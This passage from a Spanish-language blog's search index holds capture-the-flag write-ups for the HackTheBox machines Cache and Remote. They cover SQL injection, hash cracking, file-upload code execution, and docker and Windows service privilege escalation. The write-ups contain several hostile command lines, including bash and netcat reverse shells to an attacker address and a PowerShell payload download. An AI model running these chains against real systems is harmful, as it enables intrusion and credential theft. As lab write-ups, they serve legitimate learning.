siempre. Enumeraci√≥n, explotaci√≥n y escalada de privilegios :)  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n: Iniciamos con un escaneo de servicios, usando nmap podemos validar que est√° corriendo cada puerto. $ nmap -p- --open -T5 -Pn -v 10. 10. 10. 188 -oG initScanPero este escaneo va algo lento, as√≠ que podemos agregarle otro par√°metro y quitar √©l -T $ nmap -p- --open --min-rate=5000 -Pn -v 10. 10. 10. 188 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T5   Forma de escanear superr√°pido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos       -Pn   Evita que realice Host Discovery, como resoluci√≥n DNS y Ping       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable, ya veremos para que    Con la funci√≥n que creo s4vitar podemos extraer los puertos del archivo initScan f√°cilmente, ya que nos los copia en la clipboard para tenerlos listos para el siguiente escaneo. Evitamos escribirlos uno a uno, en este caso se ve innecesario al ser solo 2 puertos, pero si tuvi√©ramos muchos puertos nos ser√≠a de mucha utilidad (: hechenle un ojo. Solo deben agregarla en mi caso al $ ~/. bashrc.  Ahora que tenemos los puertos, haremos un escaneo para validar que versi√≥n y scripts maneja en este caso el puerto HTTP y el SSH. $ nmap -p22,80 -sC -sV 10. 10. 10. 188 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo    Veamos la p√°gina web (puerto 80): Leyendo (todo es interesante) pero con respecto al reto, vemos un /login. html e informaci√≥n en /author. html, primero inspeccionemos login. html.  Es un simple login, pero que si hacemos pruebas, primero v√°lida que el campo password sea igual a algo, si no, nos muestra una alerta diciendo que lo que pusimos no concuerda con ‚Äúalgo‚Äù y despu√©s hace lo mismo con el campo username. En este caso se me viene a la mente hacer un fuzzing a los campos (con wfuzz es f√°cil), ya que si le atinamos al campo password supongo que ya no nos va a mostrar ninguna alerta. Mirando el c√≥digo fuente vemos que la petici√≥n se env√≠a a la p√°gina /net. html (esto es un rabbit hole, pero igual les comentar√© que hice r√°pidamente :P). Cuando queremos ingresar nos redirige a /login. html, pero igual podemos ver el c√≥digo fuente de /net. html en una nueva pesta√±a con CTRL + U.  Y ac√° vemos el redireccionamiento, pero nada m√°s‚Ä¶ Una imagen, que podr√≠amos pensar en esteganografia como un m√©todo a ver si esconde algo (pero no, no hay nada, es todo una mentira e. e) Pues nada, ac√° me perd√≠ completamente, no ve√≠a nada que resaltara‚Ä¶ (d√≠ganme que tambi√©n vieron algo poco usual en la imagen del /login. html, por que yo estuve estancado con el login por no ver eso). Bueno pues en la imagen nos muestra un script de jquery llamado functionality. js Y si nos dirigimos a ver el script obtenemos unas credenciales, probablemente para usar en otro sitio, debemos seguir enumerando, ya que no hay nada que nos sirva en /net. html‚Ä¶ Intentando conectarnos con estas credenciales por el servicio SSH no funciona :(  username: ash password: H@v3_funTambi√©n despu√©s de estar estancado sin saber hacia donde ver, alguien me hecho una manito dici√©ndome que el autor me quer√≠a decir algo. (author. html).  Pues mirando nos dice que tiene otro proyecto llamado Hospital Management System (HMS), el cual si buscamos en internet es un software que gestiona/controla diferentes aspectos dentro de una cl√≠nica, tales como el administrativo, legal y financiero. Pues el software ya tiene exploits relacionados a SQLi y uno que hace un bypass de autenticaci√≥n. Perooooo si todo est√° relacionado, entonces tenemos que ver que vHost est√° alojado en el servidor 10. 10. 10. 188/algoquenoslleveaHMS. Si miramos los exploits de HMS, siempre los relacionan as√≠:  10. 10. 1. 188/hospital/hospital/hms/cositasparomper. html 10. 10. 1. 188/hms/cositasparomper. htmlPero todas nos dan respuesta 404, as√≠ que debemos seguir enumerando. Pues estuve mucho tiempo varado, perdido, no sab√≠a que hacer realmente, estuve revisando el foro de HTB pero las pistas me parec√≠a haberlas hecho e intentado antes‚Ä¶ Con base en lo que dice la p√°gina inicial y la p√°gina del autor haciendo alusi√≥n a cache. htb, intente modificar en el archivo /etc/hosts, para que cuando haga una petici√≥n en el navegador hacia cache. htb me redirija como si estuviera colocando 10. 10. 10. 188.  Sobre el archivo hosts, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.  Info sobre el archivo /etc/hostsHaciendo la prueba con cache. htb me daba el mismo output de la p√°gina inicial. cat /etc/hosts 10. 10. 10. 188 cache. htbPero indagando y leyendo, ca√≠ en cuenta que tenemos un ‚Äúalgo‚Äù relacionado a HMS, entonces podemos intentar que nuestra direcci√≥n IP 10. 10. 10. 188 interprete su contenido con el hostname hms. htb en nuestro archivo /etc/hosts. cat /etc/hosts 10. 10. 10. 188 hms. htbPonemos en la barra del navegador hms. htb y‚Ä¶ Opa, perfecto, tenemos un login y un nuevo software, openEMR. (no pude quitar el Invalid username or password para que quedara bien la imagen :s).  OpenEMR: Es un software de administraci√≥n de pr√°ctica m√©dica qu√© tambi√©n apoya registros m√©dicos electr√≥nicos. Pues inicialmente no hay ni credenciales por default, ni en el login logre hacer alguna SQLi o alg√∫n tipo de XSS. Revisando la documentaci√≥n hay muchas cosas interesantes, tenemos un √°rbol de archivos para revisar (de los cuales podemos sacar nombres de tablas y columnas), tambi√©n algunos archivos principales yyy mucho por aprender :P  Ac√° esta la estructura que maneja el software. Algunos de ellos nos dan info de tablas, en este caso list√© solo las que tuvieran la tabla users.  De la documentaci√≥n hacen referencia a un archivo http://hms. htb/admin. php el cual almacena el nombre de la base de datos y la versi√≥n que tiene instalada el servidor.       Site ID   DB Name   Site Name   Version   Action         default   openemr   OpenEMR   5. 0. 1 (3)   Log In   ‚Ä¶ Enumerando y enumerando ando, en la documentaci√≥n y en la web se hace referencia a muchos archivos, algunos interesantes pero sin nada interesante :P Existen vaaaaaaaaaaarias vulnerabilidades en vaaaaaaaaarios archivos que maneja el servicio. Encontr√© un documento en el que relaciona la mayor√≠a, es alucinante, emocionante y preocupante :D  Reporte de vulnerabilidades. pdf. Bueno, empieza la locura :P En el mismo . pdf la mayor√≠a de cosas hermosas a explotar las podemos hacer solo si estamos autenticados con alg√∫n usuario‚Ä¶ Peero tambi√©n tenemos algunos bypass authentication, entonces siguiendo uno de ellos (prueba y error) logramos obtener una vulnerabilidad SQLi Blind. Alguna info sobre SQLi Blind:  sql-injection/blind.  blind-sql-injection.  blind-sql-injection-i-de-en-mysql.  s4vitar no puede faltar. Pues siguiendo el documento vemos que si hacemos una petici√≥n a alguna p√°gina que necesite autenticaci√≥n, claramente nos debe salir un error o algo inform√°ndonos que no tenemos credenciales v√°lidas. Ejemplo:  Si hacemos una petici√≥n a http://hms. htb/portal y desde esa p√°gina (u otra) intentamos entrar a alguna p√°gina que si o si necesite autenticaci√≥n (por ejemplo a /portal/find_appt_popup_user. php), pues nos va a salir un error y nos redirigir√° a /portal. Pero si primero hacemos una petici√≥n a http://hms. htb/portal/account/register. php y posteriormente volvemos a hacer la petici√≥n a /portal/find_appt_popup_user. php nos dejar√° ver su respuesta :o Lo que hace la p√°gina register. php es que guarda 2 cookies, pero en este caso como si el usuario ya estuviera creado, pues nos aprovechamos de eso y usamos esas cookies para ingresar a alguna p√°gina que necesite autenticaci√≥n. Como de nuestra enumeraci√≥n inicial obtuvimos el nombre de la base de datos, algunas tablas y tambi√©n algunos nombres de columnas. Pues podemos ahorrarnos la fase de descubrir eso e intentar sacar info de alguna tabla. ‚Ä¶ Explotacion: Me apoy√© en el video de s4vitar para crear un exploit que me ayudara a explotar la vulnerabilidad, ya sabemos que tenemos una tabla llamada users (igual con el exploit podemos obtenerlos), ser√° nuestro principal foco, queda dumpear la tabla a ver que data tiene.  Listando los usuarios de la tabla obtuve uno que me llama la atenci√≥n, veamos como est√° guardada la password.  Ac√° nos vamos fuertemente troleados :s Esa password no nos funciona en ning√∫n lado, y pues validando con los dem√°s usuarios que vimos sale la misma password :P debemos enumerar m√°s a ver que tablas pueden llamar la atenci√≥n. Investigando y concatenando cositas logramos obtener las tablas y ordenarlas de manera descendente para tener todo lo que tenga que ver con user m√°s r√°pido.  (Solo como 2 horas despu√©s de haber hecho esto, vi que en mis notas y archivos interesantes tambi√©n obtuve un archivo, database. sql‚Ä¶ Y si, el archivo tiene los nombres de las tablas creadas (: (: (: (: pero bueno, aprendimos a poner el DESC en una inyecci√≥n SQL blind :P) Tenemos dos que se ven interesantes, pero me inclino por la que contiene algo sobre seguridad, veamos que columnas tiene la tabla users_secure.  Y probemos de una con el usuario openemr_admin y veamos si podemos obtener la password, que lo m√°s seguro es que est√© en formato hash, ya que tenemos un campo salt.  hash = $2a$05$l2stlig6gtbeybf7takl6ttewjdmxs9bi6lxqlfcpecy6vf6p0bsalt = $2a$05$l2stlig6gtbeybf7takl6a$Pero revisando en la web tipos de hash, puede ser un bcrypt (por las iniciales, pero ning√∫n identificador lo reconoce), solo que en la mayor√≠a de los casos (ser√≠a muy loco donde nuestro hash no) tambi√©n existen may√∫sculas‚Ä¶ Y en el que tenemos solo -tenemos- min√∫sculas‚Ä¶ Jmmmmm.  Informaci√≥n sobre los Hashes. Fue todo un reto (m√°s que todo por que ten√≠a un signo mal en el script que no hab√≠a captado y yo como loco buscando y releyendo cosas) pero logr√© encontrar la manera que me trajera la info tal como est√° en la tabla. Ya que nuestra anterior consulta no era sensible a may√∫sculas o min√∫sculas. Intente poner en nuestra variable dic el abecedario en may√∫scula pero daba igual, si encontraba la letra la tra√≠a en min√∫scula. Logre solucionarlo pasando cada car√°cter a ASCII, para posteriormente compararlo con un rango de valores que trabajaban como una tabla ASCII y con ese resultado, pasar el decimal a car√°cter. Igual son√≥ complicado (o no) pero es super sencillo:  S√≠ el primer car√°cter del campo password es la j (a√∫n no lo sabriamos), en ASCII ser√≠a: 106 (esto lo mostraria el exploit), simplemente tomando ese 106 y comparandolo con el 106 de la tabla ASCII, podemos darnos cuenta que la j corresponde al 106, por lo tanto que la primera letra del campo password es la j‚Ä¶ Y asi con toda la cadena :) hash = $2a$05$l2sTLIG6GTBeyBf7TAKL6. ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. salt = $2a$05$l2XTLIG6GTBeyBf7TAKL6A$Claramente son muy diferentes con respecto a los otros que ya hab√≠amos obtenido. Podemos usar de nuevo alg√∫n identificador de hashes, el cual nos confirma que es un hash bcrypt. Usar√© hashcat para intentar crackearlo. $ hashcat -m 3200 -a 0 hash. txt /usr/share/wordlists/rockyou. txt -m : Tipo de hash a crackear -a 0 : Ataque por diccionario hash. txt : Ac√° tenemos nuestro hash rockyou. txt : El wordlist que queremos emplear Y listo, parece error o inusual (lo es) pero esa es la password del usuario openemr_admin para ingresar al login de http://hms. htb/ Listo, revisando el mismo pdf que contiene un incre√≠ble recuento de vulnerabilidades podemos ver varias maneras de obtener ejecuci√≥n de comandos, entre ellas una que ya tiene un exploit para solo ejecutar el comando y ya estar√≠amos dentro. Pero algo me freno de usar ese script y es que al ejecutarlo modifica la configuraci√≥n global y al ser una m√°quina que no solo nosotros usamos, probablemente la da√±e y sea necesario resetear la m√°quina. Si no queremos que modifique las configuraciones globales debemos cambiar el payload, pero no entend√≠ que deb√≠a cambiar‚Ä¶ As√≠ que opte por buscar otra vulnerabilidad (tenemos varias) que podamos usar. Encontramos un file upload vulnerability que podemos usar para montar un archivo y modificar su contenido para ejecutar comandos en el sistema.  Nos indica que va a guardar los archivos en /public_html/sites/default/, pero si validamos, esa ruta no existe. Buscando por internet encontramos un PoC que explota esta vulnerabilidad y tambi√©n nos indica la ruta donde se guardar√°n los archivos, /sites/default/.  Remote Code Execution OpenEMR. Si seguimos el PoC, interceptamos la petici√≥n y modificamos su contenido, logramos subir el archivo‚Ä¶ Intente cambiarle el nombre pero al parecer solo recibe custom_pdf. php, si revisamos de nuevo la p√°gina vemos en el apartado Edit File, que entre esos esta por default el archivo que queremos subir, as√≠ que debe hacer una validaci√≥n en la que simplemente se puedan editar los archivos de esa lista. (no logre tomar screen a la lista, pero al menos vemos que sin haber subido a√∫n el archivo (queda en ti creerme :P) aparece por default).  Bueno, mucho texto y nada que explotamos esto e. e.  En el contenido simplemente recibimos una petici√≥n get y lo que sea, ser√° ejecutado en el sistema. Mandemos una Reverse Shell a ver‚Ä¶ Ya saben, es necesario que pasemos a URL encode nuestra petici√≥n, ya que probablemente el navegador no haga nada si le pasamos por ejemplo: xmd=?bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 15. 21/4433 0&gt;&amp;1'No har√° nada, pensaremos que est√° mal y no, solo debemos pasarla a URL encode y quedar√≠a como en la imagen (: La Shell que tenemos no es completamente interactiva, por lo tanto debemos darle un tratamiento a la tty, algunos links donde se explica.  Convertir a una shell completamente interactiva Resumido y facil (Gracias s4vitar)Ahora que estamos en la m√°quina procedemos a enumerar usuarios.  Tenemos al usuario ash y luffy, si recuerdan al inicio de nuestra enumeraci√≥n obtuvimos unas credenciales de ash su contrase√±a era H@v3_fun, validemos si nos permite ingresar.  Enumerando el archivo $ /etc/passwd vemos 2 programas interesantes, mysql y memcached.  Podr√≠amos intentar con mysql ver si luffy est√° en la base de datos y obtener su password, pero no tendr√≠a sentido que (en caso de estar) la contrase√±a nos funcione, ya que ser√≠a una contrase√±a pero de openemr √≥sea del login y necesitamos una pero del sistema. Validando memcached por internet, la definici√≥n nos la da claramente el mismo soporte.  Sistema de almacenamiento en cach√©‚Ä¶ Dise√±ado para acelerar las aplicaciones web din√°micas aliviando la carga de la base de datos. Pues esto ya suena raro e interesante. Previamente hab√≠a visualizado con $ netstat -a que el puerto 11211 estaba a la escucha en local y siguiendo este informe (u otros) podemos ver que memcached usa ese puerto, los pasos para usarlo est√°n en el mismo informe.  Tutorial: Accessing-Memcached-from-the-command-line. Demosle $ telnet localhost 11211. . . . . . &gt; stats # Vemos estadisticas importantes del servidor que corre Memcached. . . STAT pid 979STAT uptime 7565STAT time 1599596958STAT version 1. 5. 6 Ubuntu. . . . . . END&gt; stats slabs # La data es guardada en  slabs  que serian como particiones en memoria. . . . . . . . . STAT 1:total_chunks 10922STAT 1:used_chunks 5STAT 1:free_chunks 10917STAT 1:free_chunks_end 0STAT 1:mem_requested 371STAT 1:get_hits 8. . . END# Vemos que solo tenemos un solo  slab (el numero al lado de STAT)  que tiene varios items, ahora podemos dumpear data con ese n√∫mero. . . &gt; stats cachedump 1 0 # El 1 es el ID del  slab  y con el 0 le indicamos que muestre todos los itemsITEM link [21 b; 0 s]ITEM user [5 b; 0 s]ITEM passwd [9 b; 0 s]ITEM file [7 b; 0 s]ITEM account [9 b; 0 s]END&gt; get user # Con esto simplemente le decimos que nos muestre que tiene ese itemVALUE user 0 5luffyEND&gt; get passwdVALUE passwd 0 90n3_p1ec3END&gt; get file VALUE file 0 7nothingEND&gt; get linkVALUE link 0 21https://hackthebox. euEND&gt; get accountVALUE account 0 9afhj556uoENDObtuvimos una contrase√±a guardada en memoria del usuario luffy, validemos si funciona ‚Ä¶ Escalada de privilegios: Muy bien, muy bien‚Ä¶ Vemos que tiene asignado el grupo docker, a hacer research y ver como podemos explotar eso‚Ä¶ Hay varios blogs donde nos explican como vulnerar esto, necesitamos saber que images tiene docker, para posteriormente ejecutar un truco con el cual docker permite crear una montura de un archivo o directorio, y pues como para ejecutar docker se necesita ser administrador o estar en el grupo docker (que ser√≠a lo mismo que ser administrador)‚Ä¶ Entonces lo que ejecutemos con docker ser√° llevado a cabo con permisos de administrador (:  Una imagen podr√≠a contener un sistema operativo Ubuntu con un servidor Apache y tu aplicaci√≥n web instalada. Las im√°genes se utilizan para crear contenedores, y nunca cambian‚Äù. JavierGarzas. com Algunos art√≠culos que encontr√© explicando la vulnerabilidad:  root-your-docker-host-in-10-seconds-for-fun-and-profit.  privilege-escalation-via-docker.  the-docker-group-and-privilege-escalation. Entonces‚Ä¶ Necesitamos una imagen, podemos ver las que tiene la m√°quina con: $ docker images Y ahora podemos decirle a docker que nos cree una montura en la que (mientras estemos conectados a docker) nos haga un espejo de (en este caso) toda la ra√≠z del sistema en el directorio /tmp/, por lo que al ingresar a tmp/ veremos la copia de los archivos y podremos recorrerla con una Shell :) como root  Documentaci√≥n docker run.  Info sobre volumes. $ docker run -it --volume /:/tmp/ ubuntu:latest -i : El que nos permite interactuar escribiendo -t : Permite tener una pseudo consola ‚Äìvolume : El responsable de la montura ubuntu:latest : La imagen que enumeramos Opaaaaaaa que hermosa forma de escalar privilegios. Ahora simplemente nos faltar√≠a ver las flags :) Pero no tenemos una Shell interactiva, ac√° podr√≠amos hacer varias cosas, pasarla a interactiva, subir el binario de netcat, crear un usuario en el sistema con privilegios para evitar hacer el proceso con docker y varias cositas m√°s‚Ä¶ ‚Ä¶ Ac√° el script que automatiza la subida del archivo y genera la petici√≥n para obtener la Shell. As√≠ que debes ponerte en escucha y ejecutarlo  fileup2revsh. py. ‚Ä¶ Una muy bonita maquina, la elevaci√≥n con docker me fascino, el inicio casi me hace llorar pero se logr√≥. En general muy buena maquina, linda linda. Bueeeno como siempre digo, gracias por leerme, espero haber aportado algo, y ya sabes, a seguir rompiendo todo (: "
    }, {
    "id": 73,
    "url": "http://localhost:4000/htb/remote",
    "title": "HackTheBox - Remote",
    "body": "2020/09/05 - M√°quina Windows nivel f√°cil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer.  TL;RD (Spanish writeup):  Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo, adem√°s muestro errores que cometi o me extiendo por que si :P por si vez mucho texto ya sabes la raz√≥n Enumeraci√≥n: Como es habitual, reviso que servicios est√° corriendo la maquina, en este caso el escaneo va lento, as√≠ que le agrego algunos para acelerar el proceso. $ nmap -p- --open -v -n --min-rate=5000 10. 10. 10. 180 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los puertos       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -n   Evita que realice Host Discovery, como resoluci√≥n DNS       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos       -oG   Guarda el output en un archivo con formato grepeable, ya veremos para qu√©    Con la funci√≥n que maneja s4vitar puedo extraer los puertos del archivo initScan.  La ejecuci√≥n es sencilla, solo se debe agregar la funci√≥n al $ ~/. bashrc y correr el comando: $ extractPorts initScan Bien, ahora solo queda pegar lo que tenemos en la clipboard y usarlo en el escaneo que har√©. $ nmap -p21,80,111,135,139,445,49665 -sC -sV 10. 10. 10. 180 -oN portScan      Par√°metro   Descripci√≥n         -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -p   Escaneo de los puertos obtenidos       -oN   Guarda el output en un archivo    Algunos puertos interesantes eh, FTP, HTTP, RPC (Remote Procedure Call), NetBIOS, Samba y un puerto alto que ni idea‚Ä¶ Empecemos con el puerto 21 FTP. : Al ingresar solo muestra esto. Puedo suponer que hay alg√∫n servicio conectado al puerto FTP, pero que ahora no vemos.  Sigamos con el servidor web del puerto 80. : Revisando la p√°gina web solo encontramos una redirecci√≥n en http://10. 10. 10. 180/contact/ que lleva a un login.  Nada m√°s, no hay credenciales por defecto, no hay injeccion SQL o XSS. Sigamos Busquemos con el puerto 111 RPC. : Internet tiene un mont√≥n de info sobre como explotar el servicio que corre en el puerto 111, entre ellos encontr√© un post donde explican que si en nuestro escaneo vemos nfs (Network File System), significa que tenemos la posibilidad de hacer una montura con la informaci√≥n que se est√° compartiendo, b√°sicamente:  Info sobre showmount y mount.  NFS: Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales. Para verificar que informaci√≥n o archivos est√°n disponibles para ver. $ showmount -e 10. 10. 10. 180 Para hacer la montura en nuestro sistema. $ mount -t nfs 10. 10. 10. 180:/site_backups ~/remote/content/rpc_info_nfs -o nolock Enumerando no encontr√© nada, no supe buscar, as√≠ que me fui para la web, si buscamos si existe alg√∫n archivo que guarde credenciales en el CMS umbraco encontramos que si, Umbraco. sdf.  Encontramos hashes y dos posibles usuarios, vamos a crackstation, john, hashcat, etc‚Ä¶ A ver si las herramientas nos pueden crackear algo.  Listo, me fui para el login, intente hasta el desespero jajaj, pero no me serv√≠a, no entend√≠a por qu√©. Simplemente no estaba tomando todo el dominio del usuario admin, es la primera vez que me encuentro con estos problemas y me gusta encontrarlo. Algunos proveedores o CMS usan el dominio junto al usuario como m√©todo para registro, por lo tanto al intentar ingresar con el usuario admin y la password no funciona. Como se ve en la imagen donde est√°n los hash, el usuario est√° junto a un dominio.  admin@htb. local Y al intentar con este usuario si me permiti√≥ ingresar al dashboard (:) Encontramos otro usuario (confirmamos el nickname ssmith en la imagen de los hash).  Listos, en este punto sabemos que estamos dentro de un CMS llamado Umbraco, lo siguiente seria buscar la versi√≥n y exploits con searchsploit o la web.  Este es el exploit: https://www. exploit-db. com/exploits/46153El exploit encontrado ¬´explota¬ª dentro de la plataforma un archivo llamado /umbraco/developer/Xslt/xsltVisualize. aspx que tiene la posibilidad de darnos un RCE con el par√°metro ctl00$body$xsltSelection. Como POC el exploit ejecuta una calculadora, pero pa que queremos una calculadora jajaj, vamos a por una reverse Shell. Revisando el c√≥digo y algunas referencias en internet, lo que le indica el programa que se va a ejecutar en la cmd (claramente) es proc. StartInfo. FileName =  calc. exe , pero esta funci√≥n necesita (si queremos ejecutar otra herramienta diferente a la calculadora :P) llevar algo en proc. StartInfo. Arguments =  whatever .  Explica como trabajan StartInfo. Arguments y StartInfo. FileName. Como ejemplo realice un ping hacia la misma m√°quina a ver si me respond√≠a.  Pero intentando cmd. exe y algunas variantes para probar whoami no podia tener output. Leyendo en internet las propiedades de StartInfo y algunos errores de stackoverflow encontr√© un error en el que me daba una pista clave :P  Algunas referencias  process-examples.  system. diagnostics. processstartinfo. argument.  how-to-pass-multiple-arguments-in-processstartinfo. Perfecto puedo ejecutar comandos dentro de la maquina, lo siguiente seria lograr una reverseshell o alguna herramienta/archivo que se vea interesante. Desde el exploit puedo ver la flag del user. txt, peeero la papita esta en conseguir una reverse shell. Despues de algunos intentos con certutil. exe no logre ejecutarlo correctamente, buscando recorde que invocando una petici√≥n con PowerShell era posible descargar algun archivo de un servidor que previamente se tenga arriba. Por lo tanto la idea es mover el binario nc. exe a una ruta de trabajo, en esa misma ruta montar un servidor web con python: python -m SimpleHTTPServer y lo siguiente seria dentro del payload indicarle esto para que descargue a Windows el archivo.  Y ya tendria en el sistema el binario netcat.  Ahora queda ejecutar una peticion con nc. exe hacia mi maquina pidiendole que llame una consola al generar la conexion :) Listos, adeeeeentro. A por la escalacion de privilegios. ‚Ä¶ Escalada de privilegios: Revisando permisos con &gt; whoami /priv me muestra esto: Revisando por internet al tener el privilegio SeImpersonatePrivilege - Impersonate a client after authentication habilitado existe un programa (JuicyPotato. exe) que se apoya en el privilegio que tenemos para ejecutar la tarea especificada como Administrador. Estuve un tiempo intentando pero no logre que funcionara, en internet hacian referencia (y en un video de ippsec que si el sistema operativo tenia que ver con Server 2019 no iba a funcionar. Asi que entend√≠ el por que de que no me sirviera) ): (o quizas fue error mio). Info del sistema: Enumerando y revisando, encontramos con el comando &gt; netstat -a las conexiones de red actuales.  Info netstat: netstat-command-usage-on-windows. Ac√° quede desconcertado, ya que el escaneo inicial no nos habia mostrado tantos puertos abiertos. Procedi a validar y en efecto, no se si el parametro --min-rate hizo que no se alcanzaran a ver esos puertos pero bueno el nuevo escaneo mostro esto.  Ac√° ya veo algo interesante, dos puertos con posibilidad de acceso remoto mediante la herramienta evil-winrm explotando el servicio WinRM para obtener una shell. Por un lado el puerto 47001 con WinRM (Windows Remote Management) y el puerto 5985 con WsMan (WS-Management).  Siguiendo con la escalaci√≥n de privilegios‚Ä¶ Estuve mis buenas horas buscando y enumerando, la enumeraci√≥n en Windows me cuesta un poco m√°s, lo raro que encontre fue que TeamViewer en su version 7 esta instalado, lo cual en ninguna maquina viene por defecto y ya es algo para fijarse (adem√°s que la maquina se llama REMOTE y‚Ä¶ que hace TeamViewer?¬ø?¬ø), de resto nada, buscando exploits en internet, archivos donde se guarden credenciales; parec√© que no supe buscar por que no encontre nada Revis√© el foro oficial en HTB de la maquina a ver si podria enfocar lo que tenia o lo que me faltaba. Pues leyendo vi que hay dos maneras para explotar, una que relacionaban con TV (perfecto para no spoilear, ademas ya sabemos que significa) y otra (que llamaban U‚Ä¶. c) que entendi solo cuando a alguien se le solto y no lo marcaron como spoiler. Vamos a resolverla por los dos metodos :) ‚Ä¶ M√©todo UsoSvc: Pues si, buscando informacion me encontre con que UsoSvc basicamente funciona como administrador de actualizaciones en windows  Este servicio es responsable de descargar, instalar y buscar actualizaciones en su computadora. Ac√° la referencia ¬øPero de que me sirve saber esto? Bueno, hay un conjunto de herramientas (Github PowerSploit), entre ellas una que podemos usar para validar que rutas de escalar privilegios tenemos (una ruta seria UsoSvc). Se me habia olvidado usarla antes, es PowerUp. ps1, usaremos una funcion que trae llamada Invoke-AllChecks.  Info del mismo archivo sobre AllChecks: Runs all functions that check for various Windows privilege escalation opportunities. Guiandome con un video de s4vitar en el que explota en una maquina el mismo servicio UsoSvc realizaremos esto: 1. Pues descargarnos PowerUp. ps1 :P2. Pasarlo a windows~ Linux: Levantamos un servidor web donde tengamos el archivo. $ python -m SimpleHTTPServer~ Windows: Podriamos correr el exploit para pasarnos el PowerUp. ps1 pero viendo el video aprendi que no era necesario, podemos hacerlo desde cmd simplemente moviendonos a la carpeta donde queremos el archivo y abriendo una sesi√≥n powershell. &gt; powershellPS &gt; Invoke-WebRequest http://10. 10. 15. 69:&lt;puerto_que_levanta_python&gt;/PowerUp. ps1 -o PowerUp. ps1 # -o de output, le ponemos el nombre de como queremos que quede el archivoPS &gt; Invoke-Module . /PowerUp. ps1PS &gt; Invoke-AllChecks | Out-File -Encoding ASCII checks. txt # Guardamos la ejecuci√≥n del modulo en un archivo llamado checks. txtListo, validando el contenido de checks. txt tenemos: Nuestro servicio UsoSvc.  Revisando este archivo no hay algo que resalte. Pues ya solo nos queda ejecutar la instrucci√≥n que el propio checks nos brinda: Invoke-ServiceAbuse -ServiceName 'UsoSvc' pas√°ndole el comando que queremos ejecutar. PS &gt; Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command  c:\Windows\TEMP\\nc. exe 10. 10. 15. 69 443 -e cmd. exe  Perfecto, tenemos una reverse Shell como usuario administrador Las flags ser√≠an estas: Lo que vi con este m√©todo es que la conexi√≥n se pierde a los pocos segundos (ya te imaginas como consegu√≠ las flags :s) Ni siquiera sabr√≠a como buscar en internet si es un problema, un comando que necesito de m√°s o incluso que la propia maquina es la que pueda estar terminando la petici√≥n. ‚Ä¶ M√©todo TV (TeamViewer): Bueno como comente arriba, en la enumeraci√≥n se ve el directorio y sus componentes dentro de Program Files (x86).  ‚Ä¶ Pero no veo nada en ninguno de ellos, en internet se habla que TeamViewer guarda en memoria y en un registro fragmentos de un ID y contrase√±a de un usuario, pero no encuentro en que registro. Peeero, me di en la tarea de volver a realizar la b√∫squeda en internet, pero en este caso leyendo bien y prestando atenci√≥n, tanta atenci√≥n que en el primer link encontr√© mi salvaci√≥n :) En un hilo de la misma comunidad de TeamViewer encontr√© esto: Opa, veamos en Windows que nos encuentra.  Bien, hay un registro de TeamViewer Versi√≥n 7, haciendo la misma instrucci√≥n pero con Version7 Vemos el ID del que se habla, un usuario admin y una contrase√±a en cifrado AES (de la cual tambi√©n se habla por internet). Pues hay un blog que explica como se ejecuta la vulnerabilidad y adem√°s nos brinda un exploit en el que solo debemos modificar la cadena AES. Pero hablando muy sencillo, es que TeamViewer usa por defecto una key y un iv, por lo tanto si esos dos par√°metros son reusables podemos, primero, desencriptar la cadena que contiene la pw y despu√©s escalar privilegios.  Ac√° la gran explicaci√≥n y el exploit. Modificando la cadena y ejecutando el exploit quedar√≠a as√≠: Perfecto, tenemos la password, que entiendo sea del usuario admin, solo nos quedar√≠a conectarnos a la m√°quina con esas credenciales Ejecutando TeamViewer nos va a pedir un ID de usuario, lo que nos permitir√≠a conectarnos al pc remoto, pero enumerando no encontr√© nada. Recordemos que antes en nuestro escaneo hab√≠amos visto dos posibles entradas abusando del servicio WinRM, bueno vamos a probar. En este caso el usuario admin del registro encontrado debe ser de TV, pero como sabemos, en Windows el usuario administrador se llama Administrator. Pues si hacemos uso de la herramienta con las credenciales que tenemos logramos obtener la Shell. El puerto con conexi√≥n remota es el 5985 y eso ser√≠a todo, ac√° vemos los directorios de las flags, que de igual forma hab√≠amos encontrado con la explotaci√≥n de UsoSvc.  ‚Ä¶ Qu√© bonita maquina, disfrute mucho la explotaci√≥n para llegar al user, casi lloro con encontrar el register key, pero me encanto. No hab√≠a explotado el servicio UsoSvc antes, pero esa explotaci√≥n fue sencilla, me sirvi√≥ para acordarme de PowerUp. ps1 y todas sus funcionalidades. De resto muchas gracias por leer este chorrazo de texto. Pero pues me gusta mostrar los fails y los success :) A romper todo &lt;3 "
    }, {
    "id": 74,
    "url": "http://localhost:4000/htb/magic",
    "title": "HackTheBox - Magic",
